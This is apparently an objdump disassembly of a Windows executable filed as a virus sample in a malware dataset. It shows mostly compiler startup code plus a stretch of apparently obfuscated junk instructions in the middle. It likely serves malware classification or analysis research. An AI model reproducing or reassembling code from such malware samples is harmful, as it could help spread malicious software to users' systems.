
malware_samples/virus/026c3a6ca8d97570ffb364d55e656d213a00b674dcc79fc5b9e67b267db39a21.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	f3 c3                	repz ret
  401002:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401009:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401010:	83 ec 1c             	sub    $0x1c,%esp
  401013:	31 c0                	xor    %eax,%eax
  401015:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  40101c:	4d 5a 
  40101e:	c7 05 cc 53 40 00 01 	movl   $0x1,0x4053cc
  401025:	00 00 00 
  401028:	c7 05 c8 53 40 00 01 	movl   $0x1,0x4053c8
  40102f:	00 00 00 
  401032:	c7 05 c4 53 40 00 01 	movl   $0x1,0x4053c4
  401039:	00 00 00 
  40103c:	c7 05 24 50 40 00 01 	movl   $0x1,0x405024
  401043:	00 00 00 
  401046:	74 68                	je     0x4010b0
  401048:	a3 08 50 40 00       	mov    %eax,0x405008
  40104d:	a1 d8 53 40 00       	mov    0x4053d8,%eax
  401052:	85 c0                	test   %eax,%eax
  401054:	74 4a                	je     0x4010a0
  401056:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
  40105d:	e8 aa 15 00 00       	call   0x40260c
  401062:	c7 04 24 ff ff ff ff 	movl   $0xffffffff,(%esp)
  401069:	e8 62 09 00 00       	call   0x4019d0
  40106e:	8b 15 e8 53 40 00    	mov    0x4053e8,%edx
  401074:	a3 1c 54 40 00       	mov    %eax,0x40541c
  401079:	a3 20 54 40 00       	mov    %eax,0x405420
  40107e:	a1 9c 61 40 00       	mov    0x40619c,%eax
  401083:	89 10                	mov    %edx,(%eax)
  401085:	e8 36 06 00 00       	call   0x4016c0
  40108a:	83 3d 10 30 40 00 01 	cmpl   $0x1,0x403010
  401091:	74 6d                	je     0x401100
  401093:	31 c0                	xor    %eax,%eax
  401095:	83 c4 1c             	add    $0x1c,%esp
  401098:	c3                   	ret
  401099:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4010a0:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  4010a7:	e8 60 15 00 00       	call   0x40260c
  4010ac:	eb b4                	jmp    0x401062
  4010ae:	66 90                	xchg   %ax,%ax
  4010b0:	8b 15 3c 00 40 00    	mov    0x40003c,%edx
  4010b6:	81 ba 00 00 40 00 50 	cmpl   $0x4550,0x400000(%edx)
  4010bd:	45 00 00 
  4010c0:	8d 8a 00 00 40 00    	lea    0x400000(%edx),%ecx
  4010c6:	75 80                	jne    0x401048
  4010c8:	0f b7 51 18          	movzwl 0x18(%ecx),%edx
  4010cc:	66 81 fa 0b 01       	cmp    $0x10b,%dx
  4010d1:	74 3f                	je     0x401112
  4010d3:	66 81 fa 0b 02       	cmp    $0x20b,%dx
  4010d8:	0f 85 6a ff ff ff    	jne    0x401048
  4010de:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%ecx)
  4010e5:	0f 86 5d ff ff ff    	jbe    0x401048
  4010eb:	8b 91 f8 00 00 00    	mov    0xf8(%ecx),%edx
  4010f1:	31 c0                	xor    %eax,%eax
  4010f3:	85 d2                	test   %edx,%edx
  4010f5:	0f 95 c0             	setne  %al
  4010f8:	e9 4b ff ff ff       	jmp    0x401048
  4010fd:	8d 76 00             	lea    0x0(%esi),%esi
  401100:	c7 04 24 50 19 40 00 	movl   $0x401950,(%esp)
  401107:	e8 34 08 00 00       	call   0x401940
  40110c:	31 c0                	xor    %eax,%eax
  40110e:	83 c4 1c             	add    $0x1c,%esp
  401111:	c3                   	ret
  401112:	83 79 74 0e          	cmpl   $0xe,0x74(%ecx)
  401116:	0f 86 2c ff ff ff    	jbe    0x401048
  40111c:	8b 89 e8 00 00 00    	mov    0xe8(%ecx),%ecx
  401122:	31 c0                	xor    %eax,%eax
  401124:	85 c9                	test   %ecx,%ecx
  401126:	0f 95 c0             	setne  %al
  401129:	e9 1a ff ff ff       	jmp    0x401048
  40112e:	66 90                	xchg   %ax,%ax
  401130:	83 ec 2c             	sub    $0x2c,%esp
  401133:	a1 c0 53 40 00       	mov    0x4053c0,%eax
  401138:	c7 44 24 10 00 50 40 	movl   $0x405000,0x10(%esp)
  40113f:	00 
  401140:	c7 44 24 08 14 50 40 	movl   $0x405014,0x8(%esp)
  401147:	00 
  401148:	c7 44 24 04 18 50 40 	movl   $0x405018,0x4(%esp)
  40114f:	00 
  401150:	c7 04 24 1c 50 40 00 	movl   $0x40501c,(%esp)
  401157:	a3 00 50 40 00       	mov    %eax,0x405000
  40115c:	a1 08 30 40 00       	mov    0x403008,%eax
  401161:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401165:	e8 aa 14 00 00       	call   0x402614
  40116a:	a3 10 50 40 00       	mov    %eax,0x405010
  40116f:	83 c4 2c             	add    $0x2c,%esp
  401172:	c3                   	ret
  401173:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  401179:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401180:	55                   	push   %ebp
  401181:	31 c0                	xor    %eax,%eax
  401183:	b9 11 00 00 00       	mov    $0x11,%ecx
  401188:	89 e5                	mov    %esp,%ebp
  40118a:	57                   	push   %edi
  40118b:	56                   	push   %esi
  40118c:	8d 55 a4             	lea    -0x5c(%ebp),%edx
  40118f:	53                   	push   %ebx
  401190:	89 d7                	mov    %edx,%edi
  401192:	83 ec 7c             	sub    $0x7c,%esp
  401195:	f3 ab                	rep stos %eax,%es:(%edi)
  401197:	b0 30                	mov    $0x30,%al
  401199:	e8 b2 13 00 00       	call   0x402550
  40119e:	29 c4                	sub    %eax,%esp
  4011a0:	8d 44 24 1b          	lea    0x1b(%esp),%eax
  4011a4:	83 e0 f0             	and    $0xfffffff0,%eax
  4011a7:	c7 00 cc cc cc cc    	movl   $0xcccccccc,(%eax)
  4011ad:	c7 40 04 cc cc cc cc 	movl   $0xcccccccc,0x4(%eax)
  4011b4:	c7 40 08 cc cc cc cc 	movl   $0xcccccccc,0x8(%eax)
  4011bb:	c7 40 0c cc cc cc cc 	movl   $0xcccccccc,0xc(%eax)
  4011c2:	c7 40 10 cc cc cc cc 	movl   $0xcccccccc,0x10(%eax)
  4011c9:	c7 40 14 cc cc cc cc 	movl   $0xcccccccc,0x14(%eax)
  4011d0:	c7 40 18 cc cc cc cc 	movl   $0xcccccccc,0x18(%eax)
  4011d7:	c7 40 1c cc cc cc cc 	movl   $0xcccccccc,0x1c(%eax)
  4011de:	83 e4 f0             	and    $0xfffffff0,%esp
  4011e1:	8b 35 d8 53 40 00    	mov    0x4053d8,%esi
  4011e7:	85 f6                	test   %esi,%esi
  4011e9:	0f 85 81 02 00 00    	jne    0x401470
  4011ef:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
  4011f5:	31 f6                	xor    %esi,%esi
  4011f7:	8b 58 04             	mov    0x4(%eax),%ebx
  4011fa:	8b 3d 5c 61 40 00    	mov    0x40615c,%edi
  401200:	eb 14                	jmp    0x401216
  401202:	39 d8                	cmp    %ebx,%eax
  401204:	0f 84 07 02 00 00    	je     0x401411
  40120a:	c7 04 24 e8 03 00 00 	movl   $0x3e8,(%esp)
  401211:	ff d7                	call   *%edi
  401213:	83 ec 04             	sub    $0x4,%esp
  401216:	89 f0                	mov    %esi,%eax
  401218:	f0 0f b1 1d 24 54 40 	lock cmpxchg %ebx,0x405424
  40121f:	00 
  401220:	85 c0                	test   %eax,%eax
  401222:	75 de                	jne    0x401202
  401224:	a1 28 54 40 00       	mov    0x405428,%eax
  401229:	31 db                	xor    %ebx,%ebx
  40122b:	83 f8 01             	cmp    $0x1,%eax
  40122e:	0f 84 f0 01 00 00    	je     0x401424
  401234:	a1 28 54 40 00       	mov    0x405428,%eax
  401239:	85 c0                	test   %eax,%eax
  40123b:	0f 84 40 02 00 00    	je     0x401481
  401241:	c7 05 04 50 40 00 01 	movl   $0x1,0x405004
  401248:	00 00 00 
  40124b:	a1 28 54 40 00       	mov    0x405428,%eax
  401250:	83 f8 01             	cmp    $0x1,%eax
  401253:	0f 84 e5 01 00 00    	je     0x40143e
  401259:	85 db                	test   %ebx,%ebx
  40125b:	0f 84 03 02 00 00    	je     0x401464
  401261:	a1 cc 40 40 00       	mov    0x4040cc,%eax
  401266:	85 c0                	test   %eax,%eax
  401268:	74 1c                	je     0x401286
  40126a:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401271:	00 
  401272:	c7 44 24 04 02 00 00 	movl   $0x2,0x4(%esp)
  401279:	00 
  40127a:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401281:	ff d0                	call   *%eax
  401283:	83 ec 0c             	sub    $0xc,%esp
  401286:	e8 f5 08 00 00       	call   0x401b80
  40128b:	c7 04 24 f0 1d 40 00 	movl   $0x401df0,(%esp)
  401292:	ff 15 58 61 40 00    	call   *0x406158
  401298:	83 ec 04             	sub    $0x4,%esp
  40129b:	a3 ec 53 40 00       	mov    %eax,0x4053ec
  4012a0:	c7 04 24 00 10 40 00 	movl   $0x401000,(%esp)
  4012a7:	e8 94 13 00 00       	call   0x402640
  4012ac:	e8 ff 06 00 00       	call   0x4019b0
  4012b1:	a1 90 61 40 00       	mov    0x406190,%eax
  4012b6:	c7 05 18 54 40 00 00 	movl   $0x400000,0x405418
  4012bd:	00 40 00 
  4012c0:	8b 00                	mov    (%eax),%eax
  4012c2:	85 c0                	test   %eax,%eax
  4012c4:	74 4e                	je     0x401314
  4012c6:	31 c9                	xor    %ecx,%ecx
  4012c8:	eb 17                	jmp    0x4012e1
  4012ca:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4012d0:	84 d2                	test   %dl,%dl
  4012d2:	74 3b                	je     0x40130f
  4012d4:	83 e1 01             	and    $0x1,%ecx
  4012d7:	74 2b                	je     0x401304
  4012d9:	b9 01 00 00 00       	mov    $0x1,%ecx
  4012de:	83 c0 01             	add    $0x1,%eax
  4012e1:	0f b6 10             	movzbl (%eax),%edx
  4012e4:	80 fa 20             	cmp    $0x20,%dl
  4012e7:	7e e7                	jle    0x4012d0
  4012e9:	89 cb                	mov    %ecx,%ebx
  4012eb:	83 f3 01             	xor    $0x1,%ebx
  4012ee:	80 fa 22             	cmp    $0x22,%dl
  4012f1:	0f 44 cb             	cmove  %ebx,%ecx
  4012f4:	eb e8                	jmp    0x4012de
  4012f6:	8d 76 00             	lea    0x0(%esi),%esi
  4012f9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401300:	84 d2                	test   %dl,%dl
  401302:	74 0b                	je     0x40130f
  401304:	83 c0 01             	add    $0x1,%eax
  401307:	0f b6 10             	movzbl (%eax),%edx
  40130a:	80 fa 20             	cmp    $0x20,%dl
  40130d:	7e f1                	jle    0x401300
  40130f:	a3 14 54 40 00       	mov    %eax,0x405414
  401314:	8b 1d d8 53 40 00    	mov    0x4053d8,%ebx
  40131a:	85 db                	test   %ebx,%ebx
  40131c:	74 15                	je     0x401333
  40131e:	0f b7 55 d4          	movzwl -0x2c(%ebp),%edx
  401322:	f6 45 d0 01          	testb  $0x1,-0x30(%ebp)
  401326:	b8 0a 00 00 00       	mov    $0xa,%eax
  40132b:	0f 45 c2             	cmovne %edx,%eax
  40132e:	a3 00 30 40 00       	mov    %eax,0x403000
  401333:	a1 1c 50 40 00       	mov    0x40501c,%eax
  401338:	89 45 90             	mov    %eax,-0x70(%ebp)
  40133b:	89 c6                	mov    %eax,%esi
  40133d:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  401344:	89 45 8c             	mov    %eax,-0x74(%ebp)
  401347:	89 04 24             	mov    %eax,(%esp)
  40134a:	e8 5d 12 00 00       	call   0x4025ac
  40134f:	85 f6                	test   %esi,%esi
  401351:	89 45 94             	mov    %eax,-0x6c(%ebp)
  401354:	8b 3d 18 50 40 00    	mov    0x405018,%edi
  40135a:	0f 8e 44 01 00 00    	jle    0x4014a4
  401360:	31 db                	xor    %ebx,%ebx
  401362:	89 fe                	mov    %edi,%esi
  401364:	8b 04 9e             	mov    (%esi,%ebx,4),%eax
  401367:	89 04 24             	mov    %eax,(%esp)
  40136a:	e8 25 12 00 00       	call   0x402594
  40136f:	8d 78 01             	lea    0x1(%eax),%edi
  401372:	89 3c 24             	mov    %edi,(%esp)
  401375:	e8 32 12 00 00       	call   0x4025ac
  40137a:	8b 4d 94             	mov    -0x6c(%ebp),%ecx
  40137d:	89 04 99             	mov    %eax,(%ecx,%ebx,4)
  401380:	8b 0c 9e             	mov    (%esi,%ebx,4),%ecx
  401383:	83 c3 01             	add    $0x1,%ebx
  401386:	89 7c 24 08          	mov    %edi,0x8(%esp)
  40138a:	89 04 24             	mov    %eax,(%esp)
  40138d:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  401391:	e8 0e 12 00 00       	call   0x4025a4
  401396:	3b 5d 90             	cmp    -0x70(%ebp),%ebx
  401399:	75 c9                	jne    0x401364
  40139b:	8b 45 8c             	mov    -0x74(%ebp),%eax
  40139e:	83 e8 04             	sub    $0x4,%eax
  4013a1:	8b 75 94             	mov    -0x6c(%ebp),%esi
  4013a4:	c7 04 06 00 00 00 00 	movl   $0x0,(%esi,%eax,1)
  4013ab:	89 35 18 50 40 00    	mov    %esi,0x405018
  4013b1:	e8 da 02 00 00       	call   0x401690
  4013b6:	a1 80 61 40 00       	mov    0x406180,%eax
  4013bb:	8b 15 14 50 40 00    	mov    0x405014,%edx
  4013c1:	89 10                	mov    %edx,(%eax)
  4013c3:	a1 14 50 40 00       	mov    0x405014,%eax
  4013c8:	89 44 24 08          	mov    %eax,0x8(%esp)
  4013cc:	a1 18 50 40 00       	mov    0x405018,%eax
  4013d1:	89 44 24 04          	mov    %eax,0x4(%esp)
  4013d5:	a1 1c 50 40 00       	mov    0x40501c,%eax
  4013da:	89 04 24             	mov    %eax,(%esp)
  4013dd:	e8 6e 12 00 00       	call   0x402650
  4013e2:	8b 0d 08 50 40 00    	mov    0x405008,%ecx
  4013e8:	a3 0c 50 40 00       	mov    %eax,0x40500c
  4013ed:	85 c9                	test   %ecx,%ecx
  4013ef:	0f 84 b6 00 00 00    	je     0x4014ab
  4013f5:	8b 15 04 50 40 00    	mov    0x405004,%edx
  4013fb:	85 d2                	test   %edx,%edx
  4013fd:	75 0a                	jne    0x401409
  4013ff:	e8 f0 11 00 00       	call   0x4025f4
  401404:	a1 0c 50 40 00       	mov    0x40500c,%eax
  401409:	8d 65 f4             	lea    -0xc(%ebp),%esp
  40140c:	5b                   	pop    %ebx
  40140d:	5e                   	pop    %esi
  40140e:	5f                   	pop    %edi
  40140f:	5d                   	pop    %ebp
  401410:	c3                   	ret
  401411:	a1 28 54 40 00       	mov    0x405428,%eax
  401416:	bb 01 00 00 00       	mov    $0x1,%ebx
  40141b:	83 f8 01             	cmp    $0x1,%eax
  40141e:	0f 85 10 fe ff ff    	jne    0x401234
  401424:	c7 04 24 1f 00 00 00 	movl   $0x1f,(%esp)
  40142b:	e8 cc 11 00 00       	call   0x4025fc
  401430:	a1 28 54 40 00       	mov    0x405428,%eax
  401435:	83 f8 01             	cmp    $0x1,%eax
  401438:	0f 85 1b fe ff ff    	jne    0x401259
  40143e:	c7 44 24 04 08 70 40 	movl   $0x407008,0x4(%esp)
  401445:	00 
  401446:	c7 04 24 00 70 40 00 	movl   $0x407000,(%esp)
  40144d:	e8 9a 11 00 00       	call   0x4025ec
  401452:	85 db                	test   %ebx,%ebx
  401454:	c7 05 28 54 40 00 02 	movl   $0x2,0x405428
  40145b:	00 00 00 
  40145e:	0f 85 fd fd ff ff    	jne    0x401261
  401464:	87 1d 24 54 40 00    	xchg   %ebx,0x405424
  40146a:	e9 f2 fd ff ff       	jmp    0x401261
  40146f:	90                   	nop
  401470:	89 14 24             	mov    %edx,(%esp)
  401473:	ff 15 40 61 40 00    	call   *0x406140
  401479:	83 ec 04             	sub    $0x4,%esp
  40147c:	e9 6e fd ff ff       	jmp    0x4011ef
  401481:	c7 05 28 54 40 00 01 	movl   $0x1,0x405428
  401488:	00 00 00 
  40148b:	c7 44 24 04 18 70 40 	movl   $0x407018,0x4(%esp)
  401492:	00 
  401493:	c7 04 24 0c 70 40 00 	movl   $0x40700c,(%esp)
  40149a:	e8 4d 11 00 00       	call   0x4025ec
  40149f:	e9 a7 fd ff ff       	jmp    0x40124b
  4014a4:	31 c0                	xor    %eax,%eax
  4014a6:	e9 f6 fe ff ff       	jmp    0x4013a1
  4014ab:	89 04 24             	mov    %eax,(%esp)
  4014ae:	e8 19 11 00 00       	call   0x4025cc
  4014b3:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4014b9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4014c0:	84 f5                	test   %dh,%ch
  4014c2:	0f af fa             	imul   %edx,%edi
  4014c5:	0d 4e f4 ab 42       	or     $0x42abf44e,%eax
  4014ca:	0f af ea             	imul   %edx,%ebp
  4014cd:	80 cf 26             	or     $0x26,%bh
  4014d0:	69 fa a7 c0 bc de    	imul   $0xdebcc0a7,%edx,%edi
  4014d6:	0f bf df             	movswl %di,%ebx
  4014d9:	c6 c2 a2             	mov    $0xa2,%dl
  4014dc:	ba 30 21 a6 46       	mov    $0x46a62130,%edx
  4014e1:	0f b7 df             	movzwl %di,%ebx
  4014e4:	ff c6                	inc    %esi
  4014e6:	68 e4 6d 6f 00       	push   $0x6f6de4
  4014eb:	81 e1 13 54 26 5d    	and    $0x5d265413,%ecx
  4014f1:	b9 35 f8 86 5f       	mov    $0x5f86f835,%ecx
  4014f6:	e8 14 00 00 00       	call   0x40150f
  4014fb:	89 e9                	mov    %ebp,%ecx
  4014fd:	8b d9                	mov    %ecx,%ebx
  4014ff:	8b ef                	mov    %edi,%ebp
  401501:	13 c3                	adc    %ebx,%eax
  401503:	0f af ee             	imul   %esi,%ebp
  401506:	c6 c3 5e             	mov    $0x5e,%bl
  401509:	81 fa 6c 4d 00 00    	cmp    $0x4d6c,%edx
  40150f:	0f af fe             	imul   %esi,%edi
  401512:	80 d0 b6             	adc    $0xb6,%al
  401515:	f7 c3 0e 75 21 4c    	test   $0x4c21750e,%ebx
  40151b:	0f af ea             	imul   %edx,%ebp
  40151e:	11 d6                	adc    %edx,%esi
  401520:	c6 c3 a1             	mov    $0xa1,%bl
  401523:	69 f8 55 97 fd 96    	imul   $0x96fd9755,%eax,%edi
  401529:	f2 2b f6             	repnz sub %esi,%esi
  40152c:	0f be df             	movsbl %bh,%ebx
  40152f:	2b e9                	sub    %ecx,%ebp
  401531:	1d e2 ea 0e a7       	sbb    $0xa70eeae2,%eax
  401536:	81 ce e9 6a f8 ff    	or     $0xfff86ae9,%esi
  40153c:	72 03                	jb     0x401541
  40153e:	0f bf c1             	movswl %cx,%eax
  401541:	b3 3f                	mov    $0x3f,%bl
  401543:	03 ce                	add    %esi,%ecx
  401545:	eb 01                	jmp    0x401548
  401547:	43                   	inc    %ebx
  401548:	81 c1 f5 70 08 00    	add    $0x870f5,%ecx
  40154e:	59                   	pop    %ecx
  40154f:	69 c6 0b 0b 62 d4    	imul   $0xd4620b0b,%esi,%eax
  401555:	81 f7 c9 a4 55 05    	xor    $0x555a4c9,%edi
  40155b:	f2 28 ef             	repnz sub %ch,%bh
  40155e:	0c f3                	or     $0xf3,%al
  401560:	88 cb                	mov    %cl,%bl
  401562:	4e                   	dec    %esi
  401563:	c7 c3 08 13 dd 4a    	mov    $0x4add1308,%ebx
  401569:	c7 c5 d3 3b e3 a7    	mov    $0xa7e33bd3,%ebp
  40156f:	81 dd 7d 64 83 cb    	sbb    $0xcb83647d,%ebp
  401575:	87 f2                	xchg   %esi,%edx
  401577:	85 fb                	test   %edi,%ebx
  401579:	0f b7 f5             	movzwl %bp,%esi
  40157c:	8d 37                	lea    (%edi),%esi
  40157e:	8b d6                	mov    %esi,%edx
  401580:	46                   	inc    %esi
  401581:	8b f7                	mov    %edi,%esi
  401583:	52                   	push   %edx
  401584:	0f af f6             	imul   %esi,%esi
  401587:	81 c6 69 fb aa d3    	add    $0xd3aafb69,%esi
  40158d:	01 de                	add    %ebx,%esi
  40158f:	58                   	pop    %eax
  401590:	c7 c6 1d e8 01 22    	mov    $0x2201e81d,%esi
  401596:	f7 c3 f5 e0 a5 9f    	test   $0x9fa5e0f5,%ebx
  40159c:	89 ca                	mov    %ecx,%edx
  40159e:	0f b6 f2             	movzbl %dl,%esi
  4015a1:	50                   	push   %eax
  4015a2:	f7 c2 2b 08 e1 0a    	test   $0xae1082b,%edx
  4015a8:	5d                   	pop    %ebp
  4015a9:	8d 15 f3 ae b3 ce    	lea    0xceb3aef3,%edx
  4015af:	8d 35 ff 76 22 2d    	lea    0x2d2276ff,%esi
  4015b5:	42                   	inc    %edx
  4015b6:	35 1e 2d 5e b8       	xor    $0xb85e2d1e,%eax
  4015bb:	8b dd                	mov    %ebp,%ebx
  4015bd:	88 ee                	mov    %ch,%dh
  4015bf:	8b c5                	mov    %ebp,%eax
  4015c1:	04 8f                	add    $0x8f,%al
  4015c3:	03 fb                	add    %ebx,%edi
  4015c5:	87 f2                	xchg   %esi,%edx
  4015c7:	38 ce                	cmp    %cl,%dh
  4015c9:	22 c5                	and    %ch,%al
  4015cb:	eb 02                	jmp    0x4015cf
  4015cd:	88 c6                	mov    %al,%dh
  4015cf:	69 c3 51 5d 11 4b    	imul   $0x4b115d51,%ebx,%eax
  4015d5:	84 fe                	test   %bh,%dh
  4015d7:	85 c1                	test   %eax,%ecx
  4015d9:	75 06                	jne    0x4015e1
  4015db:	69 c7 d0 4d 74 1c    	imul   $0x1c744dd0,%edi,%eax
  4015e1:	1d 44 13 62 6b       	sbb    $0x6b621344,%eax
  4015e6:	89 cd                	mov    %ecx,%ebp
  4015e8:	85 f9                	test   %edi,%ecx
  4015ea:	87 df                	xchg   %ebx,%edi
  4015ec:	0f be ff             	movsbl %bh,%edi
  4015ef:	88 d3                	mov    %dl,%bl
  4015f1:	88 fb                	mov    %bh,%bl
  4015f3:	81 c1 4f 89 00 00    	add    $0x894f,%ecx
  4015f9:	81 fa 28 88 00 00    	cmp    $0x8828,%edx
  4015ff:	77 0b                	ja     0x40160c
  401601:	29 fb                	sub    %edi,%ebx
  401603:	c7 c0 5d 22 8a 7f    	mov    $0x7f8a225d,%eax
  401609:	c6 c0 98             	mov    $0x98,%al
  40160c:	81 e9 e4 01 00 00    	sub    $0x1e4,%ecx
  401612:	0f af f1             	imul   %ecx,%esi
  401615:	1a c4                	sbb    %ah,%al
  401617:	53                   	push   %ebx
  401618:	8d 35 3f 04 98 a8    	lea    0xa898043f,%esi
  40161e:	69 f0 aa f5 3f c1    	imul   $0xc13ff5aa,%eax,%esi
  401624:	0f b7 f0             	movzwl %ax,%esi
  401627:	21 cd                	and    %ecx,%ebp
  401629:	4f                   	dec    %edi
  40162a:	be 14 a8 f5 68       	mov    $0x68f5a814,%esi
  40162f:	c7 c5 06 d2 2e 6f    	mov    $0x6f2ed206,%ebp
  401635:	3b c5                	cmp    %ebp,%eax
  401637:	86 dc                	xchg   %bl,%ah
  401639:	87 ea                	xchg   %ebp,%edx
  40163b:	30 da                	xor    %bl,%dl
  40163d:	46                   	inc    %esi
  40163e:	c6 c6 19             	mov    $0x19,%dh
  401641:	80 fc 62             	cmp    $0x62,%ah
  401644:	55                   	push   %ebp
  401645:	b0 67                	mov    $0x67,%al
  401647:	ff ca                	dec    %edx
  401649:	51                   	push   %ecx
  40164a:	85 c6                	test   %eax,%esi
  40164c:	72 0c                	jb     0x40165a
  40164e:	8d 3d d3 07 d6 d1    	lea    0xd1d607d3,%edi
  401654:	0f bf f7             	movswl %di,%esi
  401657:	c6 c7 3d             	mov    $0x3d,%bh
  40165a:	c3                   	ret
  40165b:	eb 01                	jmp    0x40165e
  40165d:	75 f4                	jne    0x401653
  40165f:	c7 04 24 10 16 40 00 	movl   $0x401610,(%esp)
  401666:	e8 85 ff ff ff       	call   0x4015f0
  40166b:	83 c4 18             	add    $0x18,%esp
  40166e:	5b                   	pop    %ebx
  40166f:	c3                   	ret
  401670:	31 db                	xor    %ebx,%ebx
  401672:	eb 02                	jmp    0x401676
  401674:	89 c3                	mov    %eax,%ebx
  401676:	8d 43 01             	lea    0x1(%ebx),%eax
  401679:	8b 14 85 a0 27 40 00 	mov    0x4027a0(,%eax,4),%edx
  401680:	85 d2                	test   %edx,%edx
  401682:	75 f0                	jne    0x401674
  401684:	eb c9                	jmp    0x40164f
  401686:	8d 76 00             	lea    0x0(%esi),%esi
  401689:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401690:	a1 20 50 40 00       	mov    0x405020,%eax
  401695:	85 c0                	test   %eax,%eax
  401697:	74 07                	je     0x4016a0
  401699:	f3 c3                	repz ret
  40169b:	90                   	nop
  40169c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4016a0:	c7 05 20 50 40 00 01 	movl   $0x1,0x405020
  4016a7:	00 00 00 
  4016aa:	eb 94                	jmp    0x401640
  4016ac:	90                   	nop
  4016ad:	90                   	nop
  4016ae:	90                   	nop
  4016af:	90                   	nop
  4016b0:	a1 84 61 40 00       	mov    0x406184,%eax
  4016b5:	ff e0                	jmp    *%eax
  4016b7:	90                   	nop
  4016b8:	90                   	nop
  4016b9:	90                   	nop
  4016ba:	90                   	nop
  4016bb:	90                   	nop
  4016bc:	90                   	nop
  4016bd:	90                   	nop
  4016be:	90                   	nop
  4016bf:	90                   	nop
  4016c0:	31 c0                	xor    %eax,%eax
  4016c2:	c3                   	ret
  4016c3:	90                   	nop
  4016c4:	90                   	nop
  4016c5:	90                   	nop
  4016c6:	90                   	nop
  4016c7:	90                   	nop
  4016c8:	90                   	nop
  4016c9:	90                   	nop
  4016ca:	90                   	nop
  4016cb:	90                   	nop
  4016cc:	90                   	nop
  4016cd:	90                   	nop
  4016ce:	90                   	nop
  4016cf:	90                   	nop
  4016d0:	55                   	push   %ebp
  4016d1:	57                   	push   %edi
  4016d2:	56                   	push   %esi
  4016d3:	53                   	push   %ebx
  4016d4:	83 ec 2c             	sub    $0x2c,%esp
  4016d7:	a1 14 30 40 00       	mov    0x403014,%eax
  4016dc:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4016e3:	00 
  4016e4:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  4016eb:	00 
  4016ec:	3d 4e e6 40 bb       	cmp    $0xbb40e64e,%eax
  4016f1:	74 0f                	je     0x401702
  4016f3:	f7 d0                	not    %eax
  4016f5:	a3 18 30 40 00       	mov    %eax,0x403018
  4016fa:	83 c4 2c             	add    $0x2c,%esp
  4016fd:	5b                   	pop    %ebx
  4016fe:	5e                   	pop    %esi
  4016ff:	5f                   	pop    %edi
  401700:	5d                   	pop    %ebp
  401701:	c3                   	ret
  401702:	8d 44 24 10          	lea    0x10(%esp),%eax
  401706:	89 04 24             	mov    %eax,(%esp)
  401709:	ff 15 44 61 40 00    	call   *0x406144
  40170f:	83 ec 04             	sub    $0x4,%esp
  401712:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  401716:	33 5c 24 14          	xor    0x14(%esp),%ebx
  40171a:	ff 15 34 61 40 00    	call   *0x406134
  401720:	89 c5                	mov    %eax,%ebp
  401722:	ff 15 38 61 40 00    	call   *0x406138
  401728:	89 c7                	mov    %eax,%edi
  40172a:	ff 15 48 61 40 00    	call   *0x406148
  401730:	89 c6                	mov    %eax,%esi
  401732:	8d 44 24 18          	lea    0x18(%esp),%eax
  401736:	89 04 24             	mov    %eax,(%esp)
  401739:	ff 15 54 61 40 00    	call   *0x406154
  40173f:	83 ec 04             	sub    $0x4,%esp
  401742:	33 5c 24 18          	xor    0x18(%esp),%ebx
  401746:	33 5c 24 1c          	xor    0x1c(%esp),%ebx
  40174a:	31 eb                	xor    %ebp,%ebx
  40174c:	31 df                	xor    %ebx,%edi
  40174e:	31 fe                	xor    %edi,%esi
  401750:	81 fe 4e e6 40 bb    	cmp    $0xbb40e64e,%esi
  401756:	74 18                	je     0x401770
  401758:	89 f0                	mov    %esi,%eax
  40175a:	f7 d0                	not    %eax
  40175c:	89 35 14 30 40 00    	mov    %esi,0x403014
  401762:	a3 18 30 40 00       	mov    %eax,0x403018
  401767:	83 c4 2c             	add    $0x2c,%esp
  40176a:	5b                   	pop    %ebx
  40176b:	5e                   	pop    %esi
  40176c:	5f                   	pop    %edi
  40176d:	5d                   	pop    %ebp
  40176e:	c3                   	ret
  40176f:	90                   	nop
  401770:	b8 b0 19 bf 44       	mov    $0x44bf19b0,%eax
  401775:	be 4f e6 40 bb       	mov    $0xbb40e64f,%esi
  40177a:	eb e0                	jmp    0x40175c
  40177c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401780:	55                   	push   %ebp
  401781:	89 e5                	mov    %esp,%ebp
  401783:	83 ec 28             	sub    $0x28,%esp
  401786:	c7 05 40 53 40 00 09 	movl   $0xc0000409,0x405340
  40178d:	04 00 c0 
  401790:	8b 45 04             	mov    0x4(%ebp),%eax
  401793:	8d 55 04             	lea    0x4(%ebp),%edx
  401796:	c7 05 44 53 40 00 01 	movl   $0x1,0x405344
  40179d:	00 00 00 
  4017a0:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4017a7:	89 15 04 51 40 00    	mov    %edx,0x405104
  4017ad:	a3 f8 50 40 00       	mov    %eax,0x4050f8
  4017b2:	a3 4c 53 40 00       	mov    %eax,0x40534c
  4017b7:	8b 45 08             	mov    0x8(%ebp),%eax
  4017ba:	a3 ec 50 40 00       	mov    %eax,0x4050ec
